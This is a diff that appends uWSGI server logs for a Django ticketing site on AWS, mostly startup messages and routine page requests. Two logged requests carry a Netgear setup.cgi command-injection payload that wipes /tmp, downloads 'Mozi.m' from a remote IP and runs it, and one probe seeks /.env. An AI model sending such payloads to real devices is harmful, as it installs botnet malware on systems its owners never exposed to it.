@@ -7971,3 +7971,1448 @@ spawned uWSGI worker 7 (pid: 3078, cores: 1)
 spawned uWSGI worker 8 (pid: 3080, cores: 1)
 spawned uWSGI worker 9 (pid: 3081, cores: 1)
 spawned uWSGI worker 10 (pid: 3082, cores: 1)
+[pid: 3080|app: 0|req: 1/1] 59.94.183.235 () {26 vars in 586 bytes} [Wed Jun  2 10:00:08 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.94.183.235:40922/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 145 bytes in 151 msecs (HTTP/1.0 500) 3 headers in 126 bytes (1 switches on core 0)
+[pid: 3080|app: 0|req: 2/2] 80.220.242.10 () {32 vars in 452 bytes} [Wed Jun  2 10:39:51 2021] GET / => generated 145 bytes in 78 msecs (HTTP/1.1 500) 3 headers in 126 bytes (1 switches on core 0)
+[pid: 3080|app: 0|req: 3/3] 209.17.97.90 () {30 vars in 388 bytes} [Wed Jun  2 10:40:40 2021] GET / => generated 145 bytes in 80 msecs (HTTP/1.0 500) 3 headers in 126 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 10:44:05 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x26d5520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x26d5520 pid: 2846 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 2846)
+spawned uWSGI worker 1 (pid: 3886, cores: 1)
+spawned uWSGI worker 2 (pid: 3887, cores: 1)
+spawned uWSGI worker 3 (pid: 3888, cores: 1)
+spawned uWSGI worker 4 (pid: 3889, cores: 1)
+spawned uWSGI worker 5 (pid: 3890, cores: 1)
+spawned uWSGI worker 6 (pid: 3891, cores: 1)
+spawned uWSGI worker 7 (pid: 3892, cores: 1)
+spawned uWSGI worker 8 (pid: 3893, cores: 1)
+spawned uWSGI worker 9 (pid: 3894, cores: 1)
+spawned uWSGI worker 10 (pid: 3895, cores: 1)
+[pid: 3895|app: 0|req: 1/1] 1.217.129.235 () {40 vars in 738 bytes} [Wed Jun  2 10:44:53 2021] GET / => generated 6405 bytes in 269 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3894|app: 0|req: 1/2] 1.217.129.235 () {40 vars in 689 bytes} [Wed Jun  2 10:44:54 2021] GET /favicon.ico => generated 179 bytes in 112 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3895|app: 0|req: 2/3] 1.217.129.235 () {42 vars in 801 bytes} [Wed Jun  2 10:45:15 2021] GET /users/register => generated 6394 bytes in 51 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+[pid: 3894|app: 0|req: 2/4] 1.217.129.235 () {42 vars in 785 bytes} [Wed Jun  2 10:45:15 2021] GET /assets/dist/js/bootstrap.bundle.min.js => generated 179 bytes in 63 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3892|app: 0|req: 1/5] 1.217.129.235 () {42 vars in 757 bytes} [Wed Jun  2 10:45:15 2021] GET /users/form-validation.js => generated 179 bytes in 118 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+Wed Jun  2 10:45:34 2021 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 6 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 5 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  2 10:45:34 2021 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 01:45:34 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x13a1330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x13a1330 pid: 3901 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 3901)
+spawned uWSGI worker 1 (pid: 3904, cores: 1)
+spawned uWSGI worker 2 (pid: 3905, cores: 1)
+spawned uWSGI worker 3 (pid: 3906, cores: 1)
+spawned uWSGI worker 4 (pid: 3907, cores: 1)
+spawned uWSGI worker 5 (pid: 3908, cores: 1)
+spawned uWSGI worker 6 (pid: 3909, cores: 1)
+spawned uWSGI worker 7 (pid: 3910, cores: 1)
+spawned uWSGI worker 8 (pid: 3911, cores: 1)
+spawned uWSGI worker 9 (pid: 3912, cores: 1)
+spawned uWSGI worker 10 (pid: 3913, cores: 1)
+[pid: 3906|app: 0|req: 1/1] 1.217.129.235 () {52 vars in 1085 bytes} [Wed Jun  2 10:45:35 2021] POST /users/register => generated 0 bytes in 339 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 1/2] 1.217.129.235 () {46 vars in 907 bytes} [Wed Jun  2 10:45:36 2021] GET / => generated 6405 bytes in 224 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 1/3] 1.217.129.235 () {44 vars in 884 bytes} [Wed Jun  2 10:45:40 2021] GET /users/login => generated 2178 bytes in 197 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 2/4] 1.217.129.235 () {52 vars in 1076 bytes} [Wed Jun  2 10:45:45 2021] POST /users/login => generated 0 bytes in 368 msecs (HTTP/1.1 302) 8 headers in 283 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 2/5] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:45 2021] GET / => generated 6499 bytes in 133 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 3/6] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:51 2021] GET / => generated 6499 bytes in 135 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 3/7] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:51 2021] GET / => generated 6499 bytes in 119 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 4/8] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:51 2021] GET / => generated 6499 bytes in 129 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 4/9] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:51 2021] GET / => generated 6499 bytes in 125 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 5/10] 1.217.129.235 () {46 vars in 948 bytes} [Wed Jun  2 10:45:52 2021] GET / => generated 6499 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 5/11] 1.217.129.235 () {42 vars in 881 bytes} [Wed Jun  2 10:46:02 2021] GET /admin => generated 0 bytes in 59 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 0)
+[pid: 3911|app: 0|req: 1/12] 1.217.129.235 () {42 vars in 883 bytes} [Wed Jun  2 10:46:02 2021] GET /admin/ => generated 0 bytes in 184 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 6/13] 1.217.129.235 () {42 vars in 920 bytes} [Wed Jun  2 10:46:03 2021] GET /admin/login/?next=/admin/ => generated 2411 bytes in 157 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 6/14] 1.217.129.235 () {52 vars in 1161 bytes} [Wed Jun  2 10:46:07 2021] POST /admin/login/?next=/admin/ => generated 0 bytes in 649 msecs (HTTP/1.1 302) 11 headers in 569 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 7/15] 1.217.129.235 () {46 vars in 974 bytes} [Wed Jun  2 10:46:07 2021] GET /admin/ => generated 7967 bytes in 141 msecs (HTTP/1.1 200) 8 headers in 293 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 7/16] 1.217.129.235 () {44 vars in 966 bytes} [Wed Jun  2 10:46:09 2021] GET /admin/category/performance/ => generated 6332 bytes in 187 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 8/17] 1.217.129.235 () {42 vars in 792 bytes} [Wed Jun  2 10:46:09 2021] GET /admin/jsi18n/ => generated 8330 bytes in 127 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 8/18] 1.217.129.235 () {44 vars in 995 bytes} [Wed Jun  2 10:46:11 2021] GET /admin/category/performance/add/ => generated 9606 bytes in 141 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 9/19] 1.217.129.235 () {42 vars in 796 bytes} [Wed Jun  2 10:46:12 2021] GET /admin/jsi18n/ => generated 8330 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 9/20] 1.217.129.235 () {52 vars in 1254 bytes} [Wed Jun  2 10:46:22 2021] POST /admin/category/performance/add/ => generated 0 bytes in 369 msecs (HTTP/1.1 302) 10 headers in 643 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 10/21] 1.217.129.235 () {46 vars in 1287 bytes} [Wed Jun  2 10:46:23 2021] GET /admin/category/performance/ => generated 8370 bytes in 149 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 10/22] 1.217.129.235 () {42 vars in 792 bytes} [Wed Jun  2 10:46:23 2021] GET /admin/jsi18n/ => generated 8330 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 11/23] 1.217.129.235 () {44 vars in 999 bytes} [Wed Jun  2 10:46:23 2021] GET /admin/category/performancedetail/ => generated 6379 bytes in 139 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 11/24] 1.217.129.235 () {42 vars in 798 bytes} [Wed Jun  2 10:46:24 2021] GET /admin/jsi18n/ => generated 8330 bytes in 370 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 12/25] 1.217.129.235 () {44 vars in 1013 bytes} [Wed Jun  2 10:46:25 2021] GET /admin/category/performancedetail/add/ => generated 11378 bytes in 146 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 12/26] 1.217.129.235 () {42 vars in 802 bytes} [Wed Jun  2 10:46:25 2021] GET /admin/jsi18n/ => generated 8330 bytes in 127 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 13/27] 1.217.129.235 () {52 vars in 1198 bytes} [Wed Jun  2 10:46:32 2021] POST /admin/category/performancedetail/add/ => generated 0 bytes in 130 msecs (HTTP/1.1 302) 10 headers in 662 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 13/28] 1.217.129.235 () {46 vars in 1318 bytes} [Wed Jun  2 10:46:32 2021] GET /admin/category/performancedetail/ => generated 8412 bytes in 134 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 14/29] 1.217.129.235 () {42 vars in 798 bytes} [Wed Jun  2 10:46:32 2021] GET /admin/jsi18n/ => generated 8330 bytes in 114 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 14/30] 1.217.129.235 () {42 vars in 871 bytes} [Wed Jun  2 10:46:41 2021] GET / => generated 7050 bytes in 149 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 15/31] 1.217.129.235 () {44 vars in 944 bytes} [Wed Jun  2 10:46:44 2021] GET /category/detail/asd => generated 4807 bytes in 126 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3912|app: 0|req: 15/32] 1.217.129.235 () {44 vars in 973 bytes} [Wed Jun  2 10:46:46 2021] GET /category/select_seat/asd => generated 4712 bytes in 150 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+<QuerySet [<Performance: asd>]>
+<QuerySet [{'id': 2, 'title_id': 'asd', 'ageGroup': 'asd', 'viewingTime': 'asd', 'priceVIP': 'asd', 'priceR': 'asd', 'priceS': 'asd', 'info_time': 'asd', 'info_delivery': 'asd'}]>
+[pid: 3913|app: 0|req: 16/33] 1.217.129.235 () {52 vars in 1153 bytes} [Wed Jun  2 10:46:50 2021] POST /category/reserved/asd => generated 3928 bytes in 136 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 17/34] 1.217.129.235 () {44 vars in 930 bytes} [Wed Jun  2 10:47:16 2021] GET / => generated 7050 bytes in 154 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3913|app: 0|req: 18/35] 1.217.129.235 () {42 vars in 870 bytes} [Wed Jun  2 10:53:27 2021] GET / => generated 7050 bytes in 140 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 3 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 1 buried after 2 seconds
+worker 2 buried after 2 seconds
+worker 4 buried after 2 seconds
+worker 5 buried after 2 seconds
+worker 7 buried after 2 seconds
+worker 9 buried after 2 seconds
+worker 10 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 10:56:01 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xdda520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xdda520 pid: 3901 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 3901)
+spawned uWSGI worker 1 (pid: 3995, cores: 1)
+spawned uWSGI worker 2 (pid: 3996, cores: 1)
+spawned uWSGI worker 3 (pid: 3997, cores: 1)
+spawned uWSGI worker 4 (pid: 3998, cores: 1)
+spawned uWSGI worker 5 (pid: 3999, cores: 1)
+spawned uWSGI worker 6 (pid: 4000, cores: 1)
+spawned uWSGI worker 7 (pid: 4001, cores: 1)
+spawned uWSGI worker 8 (pid: 4002, cores: 1)
+spawned uWSGI worker 9 (pid: 4003, cores: 1)
+spawned uWSGI worker 10 (pid: 4004, cores: 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 01:58:42 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x1d7d330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x1d7d330 pid: 2874 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 2874)
+spawned uWSGI worker 1 (pid: 3100, cores: 1)
+spawned uWSGI worker 2 (pid: 3101, cores: 1)
+spawned uWSGI worker 3 (pid: 3102, cores: 1)
+spawned uWSGI worker 4 (pid: 3103, cores: 1)
+spawned uWSGI worker 5 (pid: 3104, cores: 1)
+spawned uWSGI worker 6 (pid: 3105, cores: 1)
+spawned uWSGI worker 7 (pid: 3106, cores: 1)
+spawned uWSGI worker 8 (pid: 3107, cores: 1)
+spawned uWSGI worker 9 (pid: 3108, cores: 1)
+spawned uWSGI worker 10 (pid: 3109, cores: 1)
+[pid: 3109|app: 0|req: 1/1] 104.131.81.110 () {30 vars in 387 bytes} [Wed Jun  2 11:06:14 2021] GET / => generated 6956 bytes in 412 msecs (HTTP/1.0 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 2/2] 162.142.125.56 () {28 vars in 299 bytes} [Wed Jun  2 11:34:05 2021] GET / => generated 6956 bytes in 98 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3107|app: 0|req: 1/3] 162.142.125.56 () {34 vars in 431 bytes} [Wed Jun  2 11:34:06 2021] GET / => generated 6956 bytes in 239 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 3/4] 51.15.139.19 () {36 vars in 456 bytes} [Wed Jun  2 12:21:38 2021] GET / => generated 6956 bytes in 126 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 4/5] 178.134.185.49 () {26 vars in 589 bytes} [Wed Jun  2 12:33:00 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.134.185.49:41877/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 179 bytes in 79 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 5/6] 3.0.92.225 () {36 vars in 567 bytes} [Wed Jun  2 13:03:51 2021] HEAD / => generated 6956 bytes in 115 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3107|app: 0|req: 2/7] 3.0.92.225 () {36 vars in 566 bytes} [Wed Jun  2 13:03:52 2021] GET / => generated 6956 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 6/8] 3.0.92.225 () {36 vars in 574 bytes} [Wed Jun  2 13:03:52 2021] GET /.env => generated 179 bytes in 46 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 1/9] 3.0.92.225 () {40 vars in 681 bytes} [Wed Jun  2 13:03:52 2021] POST / => generated 1529 bytes in 107 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 7/10] 167.99.222.78 () {32 vars in 452 bytes} [Wed Jun  2 13:15:09 2021] GET / => generated 6956 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 8/11] 128.1.248.26 () {34 vars in 474 bytes} [Wed Jun  2 13:43:57 2021] GET / => generated 6956 bytes in 122 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3109|app: 0|req: 9/12] 71.6.232.4 () {34 vars in 472 bytes} [Wed Jun  2 14:59:05 2021] GET / => generated 6956 bytes in 244 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 15:08:12 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xa26520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xa26520 pid: 2874 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 2874)
+spawned uWSGI worker 1 (pid: 7707, cores: 1)
+spawned uWSGI worker 2 (pid: 7708, cores: 1)
+spawned uWSGI worker 3 (pid: 7709, cores: 1)
+spawned uWSGI worker 4 (pid: 7710, cores: 1)
+spawned uWSGI worker 5 (pid: 7711, cores: 1)
+spawned uWSGI worker 6 (pid: 7712, cores: 1)
+spawned uWSGI worker 7 (pid: 7713, cores: 1)
+spawned uWSGI worker 8 (pid: 7714, cores: 1)
+spawned uWSGI worker 9 (pid: 7715, cores: 1)
+spawned uWSGI worker 10 (pid: 7716, cores: 1)
